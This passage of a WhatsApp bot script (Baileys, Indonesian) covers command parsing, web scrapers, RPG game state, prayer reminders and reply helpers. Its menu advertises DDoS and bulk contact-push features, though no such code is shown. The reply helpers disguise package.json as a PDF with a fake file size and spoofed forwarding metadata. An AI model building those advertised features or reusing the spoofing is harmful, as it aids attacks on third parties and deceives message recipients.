/* 
__________________________________________________

 * Base By Siputzx
 * Created On 6/8/2024
 * Contact Me on wa.me/2347082664317
 * Supported By Gpt Assistant 
 
  - Queen_Teni_Claire Is awesome -
 
 • Base Remaked By ziyo
 • No Having Team For Ever
__________________________________________________

< Queen_Teni_Claire > [ 1.0 ] >>> FIX - PROJECT ()

SUPPORT BUTTON, ALL RESPON •
FITUR JADIBOT SCAN / NO SCAN •
PROJECT RPG •
BETON GESER / COPPY / BETON LIST •
TEMPORARY •
SCRAPE •
CREATE PANEL •
CREATE VPS •
GAME • 
DLL.. •

[ OTW REAL SERBA GUNA ]

< • = sudah >
___________________________________________________

*/
















require('./config')
const absenData = {}
const vote = {}
const gamewaktu = 30
const chalk = require("chalk")
const crypto = require('crypto')
const cfont = require("cfonts")
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { youtubedl, youtubedlv2 } = require('@bochilteam/scraper-sosmed');
const Remove = require('removebg-id');
const fg = require('api-dylux')
const emojiRegex = require('emoji-regex');
const { v4: uuidv4 } = require('uuid')
const { exec, spawn, execSync } = require("child_process")
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const FormData = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik, webp2mp4File } = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4800)
const { jadibots, connss } = require("./jadibots")
const { jadibot, conns } = require("./jadibot")
const { addExif } = require('./lib/exif')
const fs = require("fs")
const { generateWAMessage, areJidsSameUser, proto, downloadContentFromMessage, prepareWAMessageMedia, generateWAMessageFromContent, generateWAMessageContent} = require("@whiskeysockets/baileys")
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys")
const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, runtime, shorturl, formatp, color, getGroupAdmins } = require("./lib/myfunc");
const {
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./system/myfunc')

module.exports = ptz = async (ptz, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
) : '';
 async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m?.chat, { text: text, mentions: m?.mentionedJid }, {
            userJid: ptz.user.id,
            quoted:m?.quoted && m?.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m?.sender, ptz.user.id)
        messages.key.id = m?.key.id
        messages.pushName = m?.pushName
        if (m?.isGroup) messages.participant = m?.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'}
ptz.ev.emit('messages.upsert', msg)}       
 /*const body = (
    m?.mtype === 'conversation' ? m?.message.conversation :
    m?.mtype === 'imageMessage' ? m?.message.imageMessage.caption :
    m?.mtype === 'videoMessage' ? m?.message.videoMessage.caption :
    m?.mtype === 'extendedTextMessage' ? m?.message.extendedTextMessage.text :
    m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
    m?.mtype === 'listResponseMessage' ? m?.message.listResponseMessage.singleSelectReply.selectedRowId :
    m?.mtype === 'templateButtonReplyMessage' ? m?.message.templateButtonReplyMessage.selectedId :
    m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
    m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
    m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
);   */
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await ptz.decodeJid(ptz.user.id);

const newowner = JSON.parse(fs.readFileSync('./database/owner.json'))

const isCreator = (m && m?.sender && [botNumber, ...newowner,...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const isPrivate = m?.fromMe || m?.author == null;    
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const frommeky = m.key.remoteJid  
const from = m.key.remoteJid  
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
const isGroup = m.key.remoteJid.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')

        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
if (!('hitcmd' in user)) user.hitcmd = 0
} else global.db.data.users[m?.sender] = {
hitcmd: 0,
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 if (!('antilinkgc' in chat)) chat.antilinkgc = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
 antilinkgc: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
if (!('setmenu' in setting)) setting.setmenu = 1
if (!('setreply' in setting)) setting.setreply = 1
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
 setmenu: 1,
 setreply: 1,
}
} catch (err) {
}

const userdb = global.db.data.users[m.sender]
const chatdb = global.db.data.chats[m.chat]
//================== [ DATABASE ] ==================//
function monospace(string) {
return '```' + string + '```'
}


    //===== [ SCRAPE ] =====//
    
    
    
async function npmstalk(packageName) {
  let stalk = await axios.get("https://registry.npmjs.org/"+packageName)
  let versions = stalk.data.versions
  let allver = Object.keys(versions)
  let verLatest = allver[allver.length-1]
  let verPublish = allver[0]
  let packageLatest = versions[verLatest]
  return {
    name: packageName,
    versionLatest: verLatest,
    versionPublish: verPublish,
    versionUpdate: allver.length,
    latestDependencies: Object.keys(packageLatest.dependencies).length,
    publishDependencies: Object.keys(versions[verPublish].dependencies).length,
    publishTime: stalk.data.time.created,
    latestPublishTime: stalk.data.time[verLatest]
  }
}



    const { queryString } = require('object-query-string')
const photoOxy = (url, text) => new Promise((resolve, reject) => {
  axios({
    method: 'GET',
    url: url,
    headers: {
      'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
    }
  })
  .then(({ data, headers }) => {
    const token = /<input type="hidden" name="token" value="(.*?)" id="token">/.exec(data)[1]
    const build_server = /<input type="hidden" name="build_server" value="(.*?)" id="build_server">/.exec(data)[1]
    const build_server_id = /<input type="hidden" name="build_server_id" value="(.*?)" id="build_server_id">/.exec(data)[1]
    const cookie = headers['set-cookie'][0]
    const form = new FormData()
    if (typeof text === 'string') text = [text]
    for (let texts of text) form.append('text[]', texts)
    form.append('sumbit', 'GO')
    form.append('token', token)
    form.append('build_server', build_server)
    form.append('build_server_id', build_server_id)
    axios({
      method: 'POST',
      url: url,
      data: form,
      headers: {
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
        'cookie': cookie,
        ...form.getHeaders()
      }
    })
    .then(({ data }) => {
      const form_value = /<div.*?id = "form_value".+>(.*?)<\/div>/.exec(data)[1]
      axios({
        method: 'GET',
        url: 'https://photooxy.com/effect/create-image?' + queryString(JSON.parse(form_value)),
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
          'cookie': cookie
        }
      })
      .then(({ data }) => {
        resolve(build_server + data.image)
      })
      .catch(reject)
    })
    .catch(reject)
  })
  .catch(reject)
})
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }















    //====== //
    const prem = JSON.parse(fs.readFileSync("./database/premium.json"))
    const rimraf = require('rimraf')
    const fitur = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
//================== [ FUNC ] ==================//
if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
let chat = global.db.data.chats[m?.chat]
if (chat && chat.isBanned && !isCreator) return
}
const userId = m.sender

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

if (body.match(`@${global.owner.split("@")[0]}`)) {
      m.reply('*`[ SYSTEM ]`* Mau Ngapain tag Owner Ku ?')
}

if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }


    let m2 = "`"

const tektek = `╭────────────────────•
│ *‎${m2}</> - I N F O - B O T - </>${m2}*
╭────────────────────•
│  •  Bot Name : ${global.botname}
│  •  Version : 1.0
│️  •  Baileys : whiskeysockets
╰────────────────────•
 ‎ ${khas} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀɪᴍᴇɴᴜ  
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴠᴏɪᴄᴇᴍᴇɴᴜ  
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴅᴏᴍᴇɴᴜ 
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀʙꜱᴇɴᴍᴇɴᴜ  
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴀʟʟᴍᴇɴᴜ  
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ʟɪɴᴏᴅᴇᴍᴇɴᴜ       
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ʀᴘɢᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴍᴇɴᴜ  
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ɢʀᴏᴜᴘᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴍᴀɪɴᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴏᴏʟꜱᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴅᴅᴏꜱᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘʜᴏᴛᴏᴏxʏᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴘᴀɴᴇʟᴍᴇɴᴜ       
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ꜱᴛɪᴄᴋᴇʀᴍᴇɴᴜ 
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴛᴇᴍᴘᴏʀᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴊᴀᴅɪʙᴏᴛᴍᴇɴᴜ
 ‎ ${khasbawah} ‎ ‎ ‎ ‎- ‎ ‎ ‎  ᴏᴡɴᴇʀᴍᴇɴᴜ
•────────────────────•`
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();

//=======// Rpg
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const isContacts = contacts.includes(sender)
          
           const { addtoken, gettoken, kurangtoken } = require("./src/alat_tukar.js")    
        const istoken = gettoken(m?.sender)
        
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion, addMahkota, KurangMahkota, getMahkota,} = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay } = require('./src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./src/limit.js')
let _petualang = JSON.parse(fs.readFileSync('./src/inventory.json'))
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./rpg.js')
let DarahAwal = global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))

// energy 
const { addInventorienergy,  cekDuluJoinAdaApaKagaDiJsonenergy,  addenergy, kurangenergy, getenergy }= require('./src/energy.js')
let energyAwal =global.rpg.energyawal
let _energyOrg = JSON.parse(fs.readFileSync('./src/energy.json'))
const isenergy = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekenergy = getenergy(m?.sender)
const isDarah = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekDarah = getDarah(m?.sender)
const isUmpan = getUmpan(m?.sender)
const isPotion = getPotion(m?.sender)
const isIkan = getIkan(m?.sender)
const isAyam = getAyam(m?.sender)
const isKelinci = getKelinci(m?.sender)
const isDomba = getDomba(m?.sender)
const isSapi = getSapi(m?.sender)
const isGajah = getGajah(m?.sender)
const isMonay = getMonay(m?.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m?.sender)
const isEmas = getEmas(m?.sender)
const isEmerald = getEmerald(m?.sender)
const isPetualang = checkPetualangUser(m?.sender)
const isInventory = cekInventoryAdaAtauGak(m?.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m?.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m?.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m?.sender)
const chatId = m.chat;
    
    const isUserRegistered = (userId) => {
            const data = fs.readFileSync('./Rpg/join.json', 'utf8');
            const users = JSON.parse(data);
            return users.some(user => user.id === userId);
        };
    const ckusrjoin = m.sender
const JSON_FILE_PATH = './Rpg/gacha_result.json';
    const { addCho, kurangCho, getCho } = require('./src/alat_tukar.js')
const isCho = getCho(m?.sender)
//==========//

// Pemberitahuan system
ptz.autoshalat = ptz.autoshalat ? ptz.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.id : m.sender;
let id = m.chat;
if (id in ptz.autoshalat) {
return false;
}
let jadwalSholat = {
shubuh: "04:29",
terbit: "05:44",
dhuha: "06:02",
dzuhur: "12:02",
ashar: "15:15",
magrib: "17:52",
isya: "19:01",
};
const datek = new Date(
new Date().toLocaleString("en-US", {
timeZone: "Asia/Jakarta",}),
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `*[ Hai kak ${pushname} ]*\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat\n\n*>> ${waktu} <<*\n*untuk wilayah Bandung dan sekitarnya.*`;
ptz.autoshalat[id] = [
m?.reply(caption),
setTimeout(async () => {
delete ptz.autoshalat[m.chat];
}, 57000),];
}}
const numbers = ['6283123448708@s.whatsapp.net', '6283117190494@s.whatsapp.net']
 let currentIndex = 0
    const cron = require('node-cron')
    /*cron.schedule("0 0 5 * * *", () => {
ptz.sendMessage(m.chat, { text : '*`<!> Bangun-bangun, sudah subuh mari kita beraktivitas`*\n\n[ Pemberitahuan Sholat-2 ]', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*`<!> Hellow Group otomatis di tutup\nSekarang saatnya tidur 😴*`'
if (groups.some(v => v === frommeky) && !(await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'announcement').then(() => ptz.sendMessage(frommeky, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await ptz.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let texct = '*`<!> Hellow Group otomatis di buka lagi\nSemoga Semua sehat selalu 🤗*`'
if (groups.some(v => v === frommeky) && (await ptz.groupMetadata(frommeky)).announce) {
ptz.groupSettingUpdate(frommeky, 'not_announcement');
ptz.sendMessage(frommeky, {text: texct, mentions: Object.values(global.db.groups[frommeky].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
ptz.groupRequestParticipantsList(frommeky).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await ptz.groupRequestParticipantsUpdate(frommeky, [i.jid], 'approve')
await sleep(2300)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })*/
    // ========= //
if (isCmd) {
    if (m.text.match(prefix)) {
    userdb.hitcmd += 1
    ptz.sendPresenceUpdate("composing", m.chat)
    } else {
    }
}

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: body
}}}
    async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m?.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./system/command.json',JSON.stringify(_db, null, 2));
}
}
    async function loading () {
var loding = [
 '*•~- `【 ▬▬4859e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬859e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬9e80x1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬▬▬▬1a79u 】` -~•*',
 '*•~- `【 ▬▬▬▬▬▬▬▬▬▬▬ 】` -~•*',
 '*•~- `【 ▬▬▬[ AWAIT ]▬▬▬ 】` -~•*'
]
let { key } = await ptz.sendMessage(m.chat, {text: '*•~- `【 ▬x1633e0ao1ae34 】` -~•*'})

for (let i = 0; i < loding.length; i++) {
await ptz.sendMessage(m.chat, {text: loding[i], edit: key });
}
}
    const reply = async(teks) => {
    if (global.setreply === "v1") {
 ptz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
           fileName: global.filename,
           fileLength: 99999999999999,
            mimetype: 'application/pdf',
           jpegThumbnail:fs.readFileSync("./thum.jpg"),
            caption: "\n" + teks,
  contextInfo: {
       showAdAttribution: true,
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `62831234487088@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsaluran,
            serverMessageId: null,
            newsletterName: global.namesaluran
        }
    }
}, { quoted: fsaluran,ephemeralExpiration: 86400});
} else if (global.setreply === "v2") {
m.reply(teks)
} else if (global.setreply === "v3") {
ptz.sendMessage(m.chat, {text:teks})
} else if (global.setreply === "v4") {
ptz.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${global.botname}`,previewType:"PHOTO",thumbnail: fs.readFileSync("./1x1.jpg"),sourceUrl: global.sourceurl,}
}, text: teks}, { quoted: m })
}
}
//$$$$//
    
    
    const randomNomor = async(ext) => {
    return `${Math.ceil(Math.random() * ext)}`
}
    
    const replym = async(teks, url, fotern) => {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: `❃ ${global.botname} - ` + fotern,
mimetype: 'application/pdf',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `\n${teks}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.title,
body: global.body ,
thumbnailUrl: url,
sourceUrl: global.sourceurl,
mediaType: 1,
renderLargerThumbnail: true 
}}}, { quoted: fsaluran,ephemeralExpiration: 86400});
    }
    
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./system/register.js')
const isRegistered = checkRegisteredUser(m?.sender)

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
